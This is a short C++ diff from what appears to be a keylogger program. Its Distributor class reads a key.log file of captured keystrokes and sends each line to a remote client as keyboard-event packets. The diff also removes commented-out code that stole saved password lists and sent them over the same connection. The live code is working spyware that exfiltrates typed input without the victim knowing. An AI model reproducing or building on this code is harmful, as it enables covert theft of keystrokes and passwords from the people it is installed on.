@@ -33,11 +33,6 @@ void Distributor::init(void)
 
 		_client->run();
 		_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
-		//StaticTools::Log << Steal.stealPasswordList() << std::endl;
-		/*if (Steal.canSteal()) {
-			*_client << _client->createPacket(PacketType::PT_Command, Steal.stealPasswordList());
-		}*/
-		
 	}
 	catch (std::exception const& e) {
 		throw (std::runtime_error(e.what()));
@@ -79,7 +74,8 @@ void Distributor::sendToSend(void)
 
 	if (ifs) {
 		while (std::getline(ifs, line)) {
-			*_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
+			//*_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
+			*_client << _client->createPacket(PacketType::PT_KeyboardEvent, line + '\n');
 		}
 		ifs.close();
 	}
